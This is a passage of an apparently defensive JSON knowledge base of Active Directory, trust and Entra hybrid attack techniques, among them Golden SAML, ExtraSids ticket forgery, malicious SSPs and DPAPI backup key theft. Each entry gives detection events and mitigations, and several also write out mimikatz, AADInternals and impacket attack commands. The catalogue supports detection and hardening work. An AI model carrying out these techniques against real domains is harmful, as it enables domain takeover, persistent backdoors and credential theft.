blocking."},{"name":"DSRM Password Abuse","aka":"Directory Services Restore Mode password abuse / DSRM Backdoor","phase":"dominance","group":"Dominance & Persistence","mitre":"T1556, T1078.002","cve":"","sev":"High","summary":"Configure the DC-local DSRM (restore mode) administrator account to allow network logon, turning it into a backdoor.","how":"Requires admin access to the DC. The DSRM account is the DC-local Administrator; obtain its hash (reg/lsadump) or set it to a known value with ntdsutil. Setting the registry DsrmAdminLogonBehavior to 2 allows network logon with the DSRM account, creating a stealthy backdoor accessible to the DC via Pass-the-Hash. Since it's not a domain account, it tends to fall outside password policy and rotation.","tools":"mimikatz (token/lsadump::sam), reg add (DsrmAdminLogonBehavior), ntdsutil","detect":"Monitor changes to the HKLM\\System\\CurrentControlSet\\Control\\Lsa\\DsrmAdminLogonBehavior registry value, and logons (4624 Logon Type 3) by the DC-local Administrator account (SID ending in 500, local). Detect SAM access on DCs and traces of DSRM hash retrieval.","events":"4657 (レジストリ変更), 4794 (DSRMパスワードリセット試行), 4624 (DSRMログオン)","mitigate":"Periodically audit that DsrmAdminLogonBehavior is not set to 2 and reset it to 0. Change the DSRM password regularly and manage it with documentation (`ntdsutil set dsrm password`). Minimize physical/admin access to DCs and monitor registry changes."},{"name":"Custom/Malicious SSP","aka":"Malicious Security Support Provider / memssp","phase":"dominance","group":"Dominance & Persistence","mitre":"T1547.005, T1556.002","cve":"","sev":"High","summary":"Persistence that registers a malicious SSP/AP DLL in LSA to continuously steal and log plaintext credentials.","how":"Requires admin rights on the DC/host. Either inject an in-memory SSP into LSASS with `mimikatz misc::memssp`, or drop a DLL (mimilib.dll) and add the SSP to the registry HKLM\\System\\CurrentControlSet\\Control\\Lsa\\Security Packages so it stays active after reboot. Thereafter every authentication logs plaintext passwords to `%SystemRoot%\\System32\\kiwissp.log` etc., enabling continuous credential collection.","tools":"mimikatz (misc::memssp, mimilib.dll)","detect":"Monitor suspicious additions to Security Packages and OSConfig/LSA-related registry (4657), DLL loads into LSASS (Sysmon EID 7), and creation of suspicious files like kiwissp.log. Periodically reconcile against known SSP registrations.","events":"4657 (Security Packagesレジストリ変更), Sysmon 7 (DLLロード)","mitigate":"Use LSA Protection (RunAsPPL) to prevent loading unsigned SSPs. Baseline-monitor the Security Packages registry with change alerts. Use WDAC/AppLocker to restrict unauthorized DLL loads into LSA."},{"name":"AdminSDHolder Persistence","aka":"SDProp abuse / AdminSDHolder ACL persistence","phase":"dominance","group":"Dominance & Persistence","mitre":"T1098, T1078.002","cve":"","sev":"High","summary":"Tamper with the AdminSDHolder object's ACL so backdoor rights are auto-reapplied to protected groups every 60 minutes.","how":"Requires Domain Admin-equivalent rights. Adding attacker-account FullControl etc. to the DACL of CN=AdminSDHolder,CN=System,<domain> causes the SDProp process (default every 60 min) to auto-copy it to the ACLs of protected groups (Domain Admins, Enterprise Admins, etc.) and their members. Even if admins fix group membership, the ACL-level backdoor keeps getting reapplied, making it a stealthy persistence mechanism.","tools":"PowerView (Add-DomainObjectAcl), ntdsutil, dsacls, BloodHound","detect":"Monitor DACL changes on the AdminSDHolder object (5136), unexpected ACEs on adminCount=1 objects, and non-privileged accounts holding GenericAll/WriteDacl etc. Periodically scan for protected-group ACL anomalies after SDProp runs.","events":"5136 (DS Object変更), 4662 (AdminSDHolderアクセス)","mitigate":"Baseline the AdminSDHolder DACL and alert on changes immediately. Periodically audit ACLs of protected groups and adminCount=1 objects and remove backdoor ACEs. Strictly manage Tier0 privileges."},{"name":"GPO Persistence/Abuse","aka":"Group Policy abuse / SharpGPOAbuse","phase":"dominance","group":"Dominance & Persistence","mitre":"T1484.001","cve":"","sev":"High","summary":"Tamper with a linked GPO to plant persistent, wide-reaching code execution via logon scripts / scheduled tasks / rights assignment.","how":"Requires write access to the target GPO (or its GPO folder in SYSVOL), obtained with an account holding GenericWrite/WriteDacl. Planting an immediate scheduled task, logon/startup script, local admin group addition (Restricted Groups), or user rights assignment (SeDebug etc.) in the GPO deploys persistent execution to all machines and users in the linked OU. This can broadly impact DCs/OUs and reach Domain Admin-level damage.","tools":"SharpGPOAbuse, PowerView (New-GPOImmediateTask), pyGPOAbuse, BloodHound","detect":"Monitor changes to GPO files in SYSVOL (GptTmpl.inf, ScheduledTasks.xml, Scripts.ini), updates to gPCMachineExtensionNames or versionNumber attributes (5136), and GPO ACL modifications. Correlate deployment traces of new scheduled tasks/scripts (4698, 5145 SYSVOL access).","events":"5136/5137 (GPOオブジェクト変更), 4698 (スケジュールタスク作成), 5145 (SYSVOLファイルアクセス)","mitigate":"Minimize GPO delegation (edit rights) and audit ACLs periodically. Monitor SYSVOL GPO file integrity and alert on version changes. Restrict GPO link changes on critical OUs and manage Tier0 GPOs separately."},{"name":"Golden Certificate","aka":"Certificate-based persistence / CA private key theft (ESC-equivalent)","phase":"dominance","group":"Dominance & Persistence","mitre":"T1649","cve":"","sev":"Critical","summary":"Steal the AD CS CA private key and forge validly signed certificates for arbitrary users, achieving long-term persistence via PKINIT authentication.","how":"Requires admin access to the CA server. Steal the CA root/issuing certificate's private key (exported as .pfx if no HSM, via DPAPI/CryptoAPI) and offline-issue a validly signed certificate (a Golden Certificate) with an arbitrary SAN/UPN. It is not invalidated by password changes or krbtgt rotation, and can obtain TGTs via PKINIT throughout the certificate's validity (years), making it extremely powerful persistence. Can be combined with ESC1-8 misconfiguration abuse.","tools":"certipy (ca/forge), ForgeCert, SharpDPAPI, mimikatz (crypto::export)","detect":"Monitor CA private key export / CryptoAPI access, suspicious processes on the CA, and PKINIT authentication with certificates absent from the issuance log. Detect discrepancies between events 4886/4887 (cert request/issuance) and actual logons (4768 with certificate), and use of certificates with unexpected UPN/SAN.","events":"4886/4887 (証明書要求/発行), 4768 (PKINIT), CAアクセス監査","mitigate":"Protect the CA private key with an HSM and make it non-exportable. Strictly protect the CA server as Tier0 and minimize admin access. On compromise, CA key reissuance (root renewal) is required. Concurrently audit certificate template permissions (ESC mitigation)."},{"name":"Kerberos Key Persistence (AES/RC4 keys)","aka":"Long-term account key retention / krbtgt AES key persistence","phase":"dominance","group":"Dominance & Persistence","mitre":"T1558, T1550.003","cve":"","sev":"High","summary":"Retain the long-term AES/RC4 keys of krbtgt or privileged accounts to continue ticket forgery and Overpass-the-Hash even after password changes.","how":"Requires having saved the AES256/AES128/RC4 keys of krbtgt/service accounts obtained via DCSync or NTDS theft. AES keys are derived from the password and salt (usually domain name + username), so the same key stays valid as long as the password is unchanged and can be reused for Golden/Silver/Diamond Ticket forgery or Overpass-the-Hash (Pass-the-Key). Since krbtgt is normally never rotated, it becomes the foundation for long-term persistence.","tools":"mimikatz (sekurlsa::ekeys, kerberos::ptt), Rubeus (asktgt /aes256), impacket (-aesKey)","detect":"Monitor single encryption types in AS-REQ (4768 encryption type) accompanying Pass-the-Key/Overpass-the-Hash, and privileged ticket requests from unusual hosts. Detect anomalous use of krbtgt/service keys and RC4 downgrade. Blocking DCSync to prevent key leakage itself is the root fix.","events":"4768/4769 (暗号化タイプ), 4624","mitigate":"Rotate krbtgt in two stages periodically to invalidate AES keys. Enforce AES and disable RC4 domain-wide, and on key leakage also update the passwords of related accounts. Prevent long-term key theft with Tier0 protection and DCSync auditing."},{"name":"Intra-forest SID History Injection (ExtraSids / Golden Ticket escalation)","aka":"ExtraSids attack, Child-to-Parent escalation, Golden Ticket with SID History","phase":"trust","group":"Trust / Cross-Forest","mitre":"T1134.005, T1558.001","cve":"","sev":"Critical","summary":"Use a child domain's KRBTGT hash to forge a Golden Ticket with the parent domain's Enterprise Admins (RID 519) SID etc. embedded in SID History, seizing the entire forest.","how":"Prerequisite: the child domain DC's KRBTGT hash (DCSync/ntds.dit) already obtained. Get the root domain SID and append `-519` (Enterprise Admins) or `-516` (Domain Controllers). Since intra-forest parent-child trusts have SID filtering disabled by default, the added SIDs are trusted as-is.","tools":"mimikatz `kerberos::golden /sids:S-1-5-21-ROOT-519`, impacket `ticketer.py --extra-sid`, Rubeus `golden`","detect":"Monitor abnormal TGT lifetimes (default 10 years), TGS requests with nonexistent accounts/RIDs, and child-domain accounts traversing to parent-domain resources within a short window. Watch event 4769 for anomalies in Ticket Options/encryption type (RC4=0x17).","events":"4769, 4768, 4672, 4624(ログオンタイプ3)","mitigate":"Rotate the KRBTGT password twice, separate Tier0, recognize that child DC compromise equals full forest compromise, and design admin boundaries at the forest level. Consider SID filtering (usually not possible for parent-child)."},{"name":"Cross-forest SID History Injection / SID Filtering Bypass","aka":"Forest trust SID filtering bypass, TREAT_AS_EXTERNAL abuse, Dirk-jan Mollema research","phase":"trust","group":"Trust / Cross-Forest","mitre":"T1134.005","cve":"","sev":"Critical","summary":"Cross-forest trusts have SID filtering (quarantine) enabled by default, but misconfiguration, SIDs with RID>1000, or TREAT_AS_EXTERNAL/enableSIDHistory being enabled allow injecting another forest's SIDs for cross-boundary escalation.","how":"Prerequisite: one forest's DC already compromised. Check whether the trust config permits SID History (netdom trust /EnableSIDHistory:yes) or check the TDO flags. Add the target forest's group SID with RID>1000 (e.g., a delegated high-privilege group) to a forged ticket. The filter drops well-known RID<1000 SIDs by default, but custom high-privilege groups can pass through.","tools":"mimikatz, impacket raiseChild.py/ticketer.py, BloodHound(越境ACL/委任の探索)","detect":"Monitor for users from the trusting forest authenticating with rights equivalent to high-privilege groups in the trusted forest. Watch 4769/4662 for use of tokens with SID History and changes to TDO attributes (msDS-TrustForestTrustInfo).","events":"4769, 4662, 4670, 4716/4717(トラスト変更)","mitigate":"Enforce SID filtering with `netdom trust /Quarantine:yes`, do not set EnableSIDHistory to yes, apply Selective Authentication, and inventory cross-boundary high-RID group delegations."},{"name":"Trust Ticket / Inter-realm TGT Forgery (Forged Trust Ticket)","aka":"Forged trust ticket, inter-realm key abuse, trust key golden ticket","phase":"trust","group":"Trust / Cross-Forest","mitre":"T1558, T1550","cve":"","sev":"Critical","summary":"Use a domain trust's shared key (trust key) to forge a referral TGT (inter-realm TGT) to the trusted domain and traverse into it.","how":"Prerequisite: obtain the trust account's NTLM hash/AES key (the TDO shared key) from a DC (lsadump::trust /patch or ntds). Use this key to forge a referral TGT (sname=krbtgt/TARGET.DOMAIN), request a TGS from the target KDC, and obtain a service ticket. Can be combined with SID History for escalation.","tools":"mimikatz `lsadump::trust /patch`, `kerberos::golden /service:krbtgt /target:parent.local /rc4:<trustkey>`, Rubeus, impacket","detect":"Watch for inter-realm TGS appearing without an accompanying normal user logon, anomalous use of the trust account name (DOMAIN$), and cross-boundary TGS over RC4. In 4769, look for patterns where Service Name is krbtgt and the Realm crosses boundaries.","events":"4769, 4768, 4776","mitigate":"Do not disable trust password auto-update (default 30 days), protect DC/LSASS at Tier0, use Selective Authentication, and protect the source of the trust key (DC LSA/NTDS)."},{"name":"Cross-forest Kerberoasting","aka":"Cross-trust Kerberoasting","phase":"trust","group":"Trust / Cross-Forest","mitre":"T1558.003","cve":"","sev":"High","summary":"Request TGS for SPN-registered accounts in the target forest across a trust and offline-crack weak service account passwords.","how":"Prerequisite: valid user credentials in one domain and the ability to perform Kerberos authentication to the target domain over the trust. Enumerate the target forest's SPNs (GetUserSPNs -target-domain), request RC4 TGS to extract hashes, and crack with Hashcat.","tools":"impacket `GetUserSPNs.py -target-domain`, Rubeus `kerberoast /domain:trusted.local`, PowerView, Hashcat","detect":"Watch for a surge of cross-boundary TGS requests, RC4 (0x17) requests, and a single principal requesting TGS for many SPNs. Correlate 4769 encryption type with Service Name.","events":"4769","mitigate":"Convert service accounts to gMSA, use 25+ character complex passwords, enforce AES, restrict cross-boundary Kerberos with Selective Authentication, and inventory SPNs."},{"name":"Cross-forest / Cross-domain Delegation Abuse (Unconstrained/Constrained/RBCD)","aka":"Trust delegation abuse, TrustedToAuthForDelegation over trust","phase":"trust","group":"Trust / Cross-Forest","mitre":"T1558, T1134","cve":"CVE-2020-0665","sev":"High","summary":"Abuse delegation configurations (unconstrained/constrained/resource-based constrained delegation) across a trust to impersonate high-privilege principals cross-boundary.","how":"Prerequisite: control a host with delegation configured, or an ACL that can write RBCD. Coerce a DC etc. to authenticate to an unconstrained delegation host and capture its TGT, or reach a cross-boundary service via constrained delegation (S4U2Proxy). Cross-forest, cross-boundary TGT delegation is disabled by default via the TDO trustAttributes (CROSS_ORGANIZATION_NO_TGT_DELEGATION), but can pass through when explicitly enabled via netdom trust /EnableTGTDelegation:Yes etc. (no attribute named msDS-EnableUnconstrainedDelegation exists).","tools":"Rubeus `s4u`/`monitor`, impacket `getST.py`, krbrelayx, PowerView(委任列挙), mimikatz","detect":"Monitor DC account authentication to unconstrained delegation hosts, anomalous S4U2Self/S4U2Proxy, and cross-boundary Forwardable TGT delegation. Watch the Transited/delegation flags in 4769.","events":"4769, 4768, 4624","mitigate":"Eliminate unconstrained delegation, set sensitive accounts to \"Account is sensitive and cannot be delegated\"/Protected Users, keep cross-forest TGT delegation disabled (default), and audit RBCD write ACLs."},{"name":"Coercion over Trust (PrinterBug / PetitPotam / DFSCoerce / ShadowCoerce)","aka":"MS-RPRN, MS-EFSRPC, MS-DFSNM, MS-FSRVP coercion across trust","phase":"trust","group":"Trust / Cross-Forest","mitre":"T1187","cve":"CVE-2021-36942","sev":"High","summary":"Coerce authentication from a target-domain machine (especially a DC) across a trust, and combine with NTLM relay or unconstrained delegation for cross-boundary credential theft and escalation.","how":"Prerequisite: network reachability to the target-domain machine with RPC allowed. Induce DC$ authentication via Spooler's RpcRemoteFindFirstPrinterChangeNotification (PrinterBug), EfsRpcOpenFileRaw (PetitPotam), or NetrDfsRemoveStdRoot (DFSCoerce), then relay to ADCS (ESC8) or LDAP, or capture it on an unconstrained delegation host.","tools":"printerbug.py, PetitPotam.py, dfscoerce.py, coercer, ntlmrelayx, krbrelayx","detect":"Watch for MS-RPRN/MS-EFSRPC/MS-DFSNM RPC calls from across the boundary, external authentication by DC accounts, and anomalous NTLM authentication to ADCS Web Enroll.","events":"4624/4625(NTLM), 5145(RPCオブジェクトアクセス), ADCS 4886/4887","mitigate":"Enforce EPA (Extended Protection) and SMB/LDAP signing, disable the Spooler service, disable NTLM on ADCS Web Enroll, filter RPC at trust boundaries, and use Selective Authentication."},{"name":"Foreign Security Principal / Foreign Group Membership Abuse","aka":"FSP abuse, cross-forest group membership","phase":"trust","group":"Trust / Cross-Forest","mitre":"T1078.002","cve":"","sev":"High","summary":"Abuse configurations where a user/group from another forest is added as an FSP to a local domain's privileged group (e.g., Administrators, DnsAdmins) for cross-boundary escalation.","how":"Prerequisite: control a principal in one forest. Use BloodHound to explore cross-boundary group memberships/ACLs (GenericAll, WriteDacl, etc.) and find/use a path where you effectively belong to a high-privilege group via an FSP.","tools":"BloodHound/SharpHound(--CollectAllProperties, trust収集), PowerView `Get-DomainForeignGroupMember`","detect":"Monitor use of privileged groups by cross-boundary principals, changes to FSP objects (CN=ForeignSecurityPrincipals), and cross-boundary ACL grants.","events":"4728/4729/4756/4757(グループメンバー変更), 5136(ディレクトリ変更)","mitigate":"Periodically inventory cross-boundary group memberships and ACLs, apply least privilege, control cross-boundary additions to domain local groups, and use Selective Authentication."},{"name":"Trust Account / TDO Password Extraction","aka":"Trust key dump, TDO secret extraction","phase":"trust","group":"Trust / Cross-Forest","mitre":"T1552, T1003","cve":"","sev":"High","summary":"Extract the Trusted Domain Object (TDO) shared key from a compromised DC to serve as the foundation for Trust Ticket forgery and NTLM validation.","how":"Prerequisite: admin access to LSA/NTDS on a DC. Use lsadump::trust /patch or secretsdump.py to obtain the current/old NTLM and AES keys of the trust account (DOMAIN$) and use them for Forged Trust Tickets.","tools":"mimikatz `lsadump::trust /patch`, impacket `secretsdump.py`, `lsadump::lsa`","detect":"Watch for LSASS/NTDS access on DCs, anomalous DRSUAPI, and subsequent cross-boundary TGS tied to the trust key.","events":"4662(DS-Replication), 4769, Sysmon 10(LSASSアクセス)","mitigate":"Credential Guard/LSA protection, Tier0 isolation, minimizing admin access to DCs, and maintaining trust password auto-update."},{"name":"Azure AD Connect Sync Account Abuse (DCSync / credential theft)","aka":"AAD Connect MSOL_ account abuse, ADSync credential extraction","phase":"trust","group":"Cloud / Hybrid (Entra)","mitre":"T1003.006, T1078.004","cve":"","sev":"Critical","summary":"Compromise the AAD Connect server or service account (MSOL_) that syncs on-prem to Entra to steal DCSync rights or high-privilege cloud credentials.","how":"Prerequisite: admin access to the AAD Connect server. Decrypt the sync account credentials from ADSync's SQL/DPAPI (MSOL_ holds DCSync=DS-Replication rights). Use this for on-prem DCSync, or use the Global Admin-equivalent Connector credentials for Entra operations.","tools":"AADInternals `Get-AADIntSyncCredentials`, adconnectdump, mimikatz(DPAPI), impacket secretsdump","detect":"Watch for DCSync by the MSOL_ account from unexpected hosts, anomalous processes on the AAD Connect server, and anomalous API use by the Connector account.","events":"4662(Replication Get Changes), 4624(MSOL_の異常元), Entra監査ログ","mitigate":"Treat the AAD Connect server as Tier0, minimize MSOL_ privileges, strictly protect the sync account, monitor Entra privileged roles, and consider disabling Password Writeback."},{"name":"Password Hash Sync (PHS) Abuse","aka":"PHS hash injection, cloud golden ticket precursor","phase":"trust","group":"Cloud / Hybrid (Entra)","mitre":"T1556, T1078.004","cve":"","sev":"High","summary":"Abuses the PHS mechanism that syncs an on-prem password-hash-derived value into Entra, letting an on-prem compromise take over cloud accounts, or forging cloud auth via hash injection.","how":"Prereq: compromise of AAD Connect/DC. Compromise the AAD Connect (ADSync) server to extract the sync service account credentials, or abuse the sync pipeline. AADInternals can set any user's cloud-side password (PBKDF2-derived hash), enabling a valid sign-in to the cloud. Note: PHS syncs a derived hash, not the raw NTLM hash, so Pass-the-Hash-style cloud auth presenting an NTLM hash is not possible.","tools":"AADInternals `Set-AADIntUserPassword`/PHS関連関数, mimikatz","detect":"Anomalous password updates via PHS, unexpected sync events, suspicious cloud-side sign-ins.","events":"Entra監査/サインインログ, 4662","mitigate":"Protect AAD Connect, Conditional Access + MFA, risk-based sign-in, least-privilege sync account."},{"name":"Pass-Through Authentication (PTA) Agent Backdoor","aka":"PTA agent injection, PTASpy, Skeleton Key for cloud","phase":"trust","group":"Cloud / Hybrid (Entra)","mitre":"T1556.007","cve":"","sev":"Critical","summary":"Injects a DLL into the PTA authentication agent to allow auth success with any password and steal plaintext credentials — a cloud auth backdoor.","how":"Prereq: admin access to the server running the PTA agent (typically the AAD Connect host). Use PTASpy or similar to hook the agent process, letting all users sign in with any password while harvesting plaintext passwords.","tools":"AADInternals `Install-AADIntPTASpy`, `Get-AADIntPTASpyLog`","detect":"Suspicious DLL/process injection on the PTA agent host, on-prem auth uncorrelated with successful sign-ins, abnormal agent restarts.","events":"Entraサインインログ, Sysmon 7/8(DLL/CreateRemoteThread), 4688","mitigate":"Isolate PTA host in Tier0, app control/EDR, Conditional Access + MFA, reconsider PTA in favor of PHS or federation, monitor agent integrity."},{"name":"Seamless SSO Silver Ticket (AZUREADSSOACC)","aka":"Seamless SSO abuse, AzureADSSOACC Kerberos ticket forgery","phase":"trust","group":"Cloud / Hybrid (Entra)","mitre":"T1558, T1550","cve":"","sev":"High","summary":"Steals the Kerberos key of the AZUREADSSOACC$ computer account created by Seamless SSO to forge a cloud SSO ticket (Silver Ticket equivalent) impersonating any user.","how":"Prereq: obtain the NTLM hash/AES key of AZUREADSSOACC$ from an on-prem DC. This account's password is not rotated by default, so any user's cross-boundary SSO ticket can be forged to sign into Entra.","tools":"AADInternals `Get-AADIntSeamlessSSO`/チケット鍛造, mimikatz, impacket","detect":"Anomalous Kerberos use tied to AZUREADSSOACC$, Seamless SSO sign-ins from unexpected sources, hash access to the target account.","events":"Entraサインインログ, 4769, 4662","mitigate":"Rotate the AZUREADSSOACC$ password regularly, Conditional Access + MFA, reassess the need for Seamless SSO, Tier0 protection."},{"name":"Golden SAML (ADFS Token-Signing Certificate Theft)","aka":"Golden SAML, ADFS token signing cert abuse","phase":"trust","group":"Cloud / Hybrid (Entra)","mitre":"T1606.002","cve":"","sev":"Critical","summary":"Steals the ADFS token-signing certificate/DKM key to generate valid SAML tokens offline for any user and any claim (including MFA satisfaction), enabling unlimited sign-in to federated targets (Entra/SaaS).","how":"Prereq: admin access to the ADFS server or the AD holding the DKM key. Extract the token-signing certificate and DKM master key, then sign SAML assertions with any NameID/claims (including MFA claim). Valid long-term until certificate renewal.","tools":"AADInternals `Export-AADIntADFSSigningCertificate`/`New-AADIntSAMLToken`, mimikatz, ADFSDump/ADFSpoof","detect":"Sign-ins that succeed without a corresponding ADFS issuance log entry, anomalous NameID/issuance times, tokens with an MFA claim despite no MFA performed, certificate export traces.","events":"ADFS 1200/1202, Entraサインインログ, 4662, 4624","mitigate":"Protect the token-signing certificate and DKM in an HSM/hardened store, keep ADFS Tier0, rotate certificates, restrict issuer/location via Conditional Access, and where possible retire federation in favor of cloud auth."},{"name":"External Trust / SID Filtering CVE-class Bypass","aka":"CVE-2020-0665, netdom quarantine misconfig, external trust abuse","phase":"trust","group":"Trust / Cross-Forest","mitre":"T1134.005","cve":"","sev":"High","summary":"Exploits implementation/configuration flaws in external trusts or SID filtering (e.g. quarantine not applied) to pass SIDs across a trust boundary that should be dropped, achieving elevation.","how":"Prereq: compromise one environment and check the trust type (external/forest) and SID filter state (netdom trust /verify, TDO attributes). On external trusts without quarantine or unpatched environments, use a forged ticket injected with SIDs that bypass filtering.","tools":"mimikatz, impacket, netdom(状態確認), BloodHound","detect":"Unexpected SID use across an external trust, TDO/trust flag changes, high-privilege cross-boundary access.","events":"4706/4716(トラスト作成/変更), 4769, 4662","mitigate":"Apply the relevant patches, enforce quarantine on external trusts, remove unneeded trusts, selective authentication, periodic audit of trust configuration."},{"name":"MachineAccountQuota Abuse (ms-DS-MachineAccountQuota)","aka":"MAQ abuse / arbitrary machine account creation / addcomputer","phase":"recon","group":"Foundational Primitives","mitre":"T1136.002","cve":"","sev":"High","summary":"With the default MachineAccountQuota of 10, any authenticated standard user can create their own computer account — a foundational primitive granting a controlled account to seed follow-on attacks.","how":"With any domain credentials, create a computer account via impacket-addcomputer or PowerMad's New-MachineAccount. The creator controls that account's msDS-KeyCredentialLink, SPN, and servicePrincipalName, and it is a common prerequisite for noPac (CVE-2021-42278/42287), RBCD, Shadow Credentials, and Certifried (CVE-2022-26923). No domain-join right or GenericWrite is needed; it works whenever MAQ >= 1.","tools":"impacket addcomputer.py, PowerMad (New-MachineAccount), StandIn, ntlmrelayx --add-computer","detect":"In Directory Service auditing, flag Security event 4741 (computer account created) where the creator (Subject) is not an admin or a dedicated domain-join account. Periodically audit for multiple machine accounts created by a single user in a short window, or computer objects whose mS-DS-CreatorSID is a standard-user SID.","events":"4741 (computer account created), 4742 (computer account changed), 5136 (mSDS-CreatorSID / servicePrincipalName変更)","mitigate":"Set ms-DS-MachineAccountQuota to 0 and restrict computer creation to delegated dedicated accounts/OU permissions only. Inventory existing mS-DS-CreatorSID values, delete machine accounts created by standard users, and control delegated creation via SDDL."},{"name":"SOAPHound / ADWS(SOAP) Stealthy Enumeration","aka":"SoaPy / ADWS collection / BloodHound over ADWS","phase":"recon","group":"Enumeration Tools & Techniques","mitre":"T1087.002","cve":"","sev":"Medium","summary":"Collects BloodHound-equivalent directory data via ADWS (TCP 9389, SOAP/MC-NBFX) instead of LDAP, evading LDAP-based detection and event 1644 — a stealthy enumeration technique.","how":"Use SOAPHound (.NET) or SoaPy (Linux) to send NBFX/NBFSE-compressed SOAP queries to the DC's ADWS endpoint, collecting users, groups, ACLs, and trusts to produce BloodHound-compatible JSON. Since ADWS is the legitimate path used by the PowerShell AD module, it bypasses LDAP query logging, SACLs, and most EDR LDAP monitoring. Runs with only authenticated standard-user credentials.","tools":"SOAPHound, SoaPy, FalconHound, 標準ADWS (ActiveDirectory PowerShell module)","detect":"Monitor for anomalous source/volume of ADWS (NetTCP 9389) connections on DCs; detect standard workstations hitting ADWS when normally only Tier0 admin hosts or AADConnect do. At the network layer, surface bulk MC-NMF/NBFX enumeration traffic.","events":"ADWS接続ログ (Directory Service / 4662 大量読取), Sysmon Event 3 (TCP 9389への接続), NetFlow上の9389","mitigate":"Restrict ADWS access to the admin host segment (limit 9389 via host firewall) and isolate Tier0 management. Rather than relying on detecting BloodHound collection, reduce the excessive permissions/ACLs that make enumeration valuable in the first place."},{"name":"Plaintext Credentials in AD Attributes","aka":"description/info/userPassword/unixUserPassword hunting, LAPS attribute read","phase":"recon","group":"Credential Discovery","mitre":"T1552","cve":"","sev":"High","summary":"An authenticated user enumerates and steals credentials stored in plaintext in attributes like description, info, userPassword, and unixUserPassword — attribute-based credential hunting beyond GPP cpassword.","how":"Via LDAP, enumerate description, info, comment, userPassword, unixUserPassword, ms-Mcs-AdmPwd (LAPS), etc. across all users/computers and search for keywords like password/pass/pwd. userPassword and unixUserPassword are sometimes stored as BASE64/plaintext and are often readable by anyone via Get-ADUser -Properties * or ldapsearch.","tools":"ldapsearch, PowerView (Get-DomainUser), ldeep, BloodHound, adPEAS, Snaffler(共有側)","detect":"Because detecting bulk reads of description/info via Directory Service Access auditing (4662) is hard, actively hunt for objects containing plaintext passwords via periodic attribute scans. Treat the mere presence of values in userPassword/unixUserPassword as anomalous and alert.","events":"4662 (property read, GUID指定SACL時), 定期LDAP棚卸しレポート","mitigate":"End the practice of storing credentials in attributes like description/info and scrub existing values via script. Disable plaintext storage in userPassword (fUserPwdSupport); treat LAPS attributes as confidential and minimize read permissions via ACL."},{"name":"SCCM/MECM Environment Enumeration","aka":"SharpSCCM recon, sccmhunter, PXE OSD enumeration","phase":"recon","group":"Enumeration Tools & Techniques","mitre":"T1087.002","cve":"","sev":"High","summary":"Reconnaissance that enumerates SCCM/MECM infrastructure — site servers, management points (MP), distribution points (DP), the Network Access Account (NAA), and PXE media — to map a major attack surface for large-scale AD compromise.","how":"Use sccmhunter or SharpSCCM to enumerate the System Management container (AD-published SCCM sites), SPNs like MSSMSMPname, and devices/collections/NAA via the management point's HTTP/WMI interface. Against PXE-enabled DPs, request OSD media unauthenticated and recover the encrypted NAA credentials from the boot variables (policy).","tools":"SharpSCCM (get), sccmhunter (find/show/get), PXEThief, ldapsearch (System Managementコンテナ)","detect":"Monitor for anomalous HTTP/WMI policy requests to management points (MP), bulk LDAP reads of the System Management container, and PXE/TFTP (UDP 69) requests from non-legitimate devices. Detect known SharpSCCM/PXEThief User-Agents and policy-request patterns in MP logs.","events":"MP IISログ (ポリシー要求), 4662 (System Managementコンテナ読取), TFTP/PXEアクセスログ","mitigate":"Set a PXE password and move off NAA entirely to Enhanced HTTP/management-point authentication. Minimize NAA privileges to block lateral movement to MSSQL/SMB shares. Review the System Management container ACL."},{"name":"Generic Password Spraying (SMB/LDAP/RDP/OWA-EWS)","aka":"non-Kerberos password spray, OWA/EWS spray","phase":"credaccess","group":"Password Attacks","mitre":"T1110.003","cve":"","sev":"High","summary":"Lockout-avoiding credential spraying that spans non-AS-REQ auth surfaces (SMB, LDAP, RDP, OWA/EWS) trying a few common passwords against many accounts.","how":"Against a collected user-enumeration list, spray guessed passwords like Season2024! to SMB (445)/LDAP (389)/RDP/OWA-EWS (443) below the lockout threshold (1 attempt/account/observation window), distributed. Exploits that lockout policy and badPwdCount propagation differ by protocol; externally exposed OWA/EWS is especially stealthy.","tools":"NetExec/NetExec, kerbrute(AS-REQ側), SprayingToolkit(atomizer/MailSniper), Hydra, Go365","detect":"Correlate 4771/4625 failures spanning multiple accounts from a single source IP in a short window. For OWA/EWS, correlate bursts of User-Agent and auth failures in Exchange/IIS logs and many-user attempts from one source in the SIEM. Monitor for broad, small increases in badPwdCount.","events":"4625 (logon failure), 4771 (Kerberos pre-auth failed), 4776 (NTLM認証), Exchange/IISログ (OWA/EWS 401)","mitigate":"Apply smart lockout (Azure AD/on-prem) and MFA (especially OWA/EWS) across all auth surfaces and disable legacy auth (Basic/EWS). Enforce a strong password policy and a breached-password dictionary block."},{"name":"SeBackupPrivilege / SeRestorePrivilege Abuse","aka":"robocopy /b, esentutl, diskshadow, SAM/SYSTEM/NTDS.dit theft","phase":"credaccess","group":"Host / Local","mitre":"T1003.002, T1003.003","cve":"","sev":"High","summary":"Abuses backup privileges to directly steal registry hives (SAM/SYSTEM) or NTDS.dit via file copy without VSS/DCSync — directly tied to abuse of Backup Operators and similar.","how":"With SeBackupPrivilege, use robocopy /b, esentutl /y, or the Win32 Backup API to bypass ACLs and copy locked files. On a DC, create a shadow copy with diskshadow to extract NTDS.dit and the SYSTEM hive, then extract offline with secretsdump. On member servers, recover local credentials from SAM/SYSTEM/SECURITY.","tools":"robocopy /b, esentutl /y /vss, diskshadow, SeBackupPrivilegeCmdLets, impacket-secretsdump, reg save","detect":"Detect diskshadow launch, esentutl/robocopy access to NTDS.dit or hives, and file access under System32\\config or the ntds path via EDR/auditing (4663). Correlate backup-privilege assignment (4672) with privilege use by processes other than backup products.","events":"4672 (special privileges assigned), 4663 (object access to SAM/ntds.dit), Sysmon 1/11 (esentutl.exe, diskshadow.exe, robocopy /b)","mitigate":"Strictly minimize members of SeBackupPrivilege-holding groups like Backup Operators, and limit interactive logon/remote operations on DCs to Tier0. Restrict backups to a dedicated service account + admin host only, and restrict execution of diskshadow/esentutl."},{"name":"DPAPI Domain Backup Key Theft","aka":"SharpDPAPI /rpc, lsadump::backupkeys, DPAPI PVK theft","phase":"credaccess","group":"Host / Local","mitre":"T1003, T1555","cve":"","sev":"Critical","summary":"Steals the DPAPI domain backup key (RSA PVK) held by the DC, giving unrestricted offline decryption of every domain user's master keys, credentials, and secrets — a whole different order of capability.","how":"With Domain Admin rights, obtain the domain backup key (.pvk) against a DC via mimikatz lsadump::backupkeys or SharpDPAPI backupkey /rpc (MS-BKRP protocol). Thereafter any user's DPAPI master key can be decrypted offline, giving a persistent capability to decrypt Credential Manager, browser-saved passwords, and certificate private keys across the domain.","tools":"mimikatz 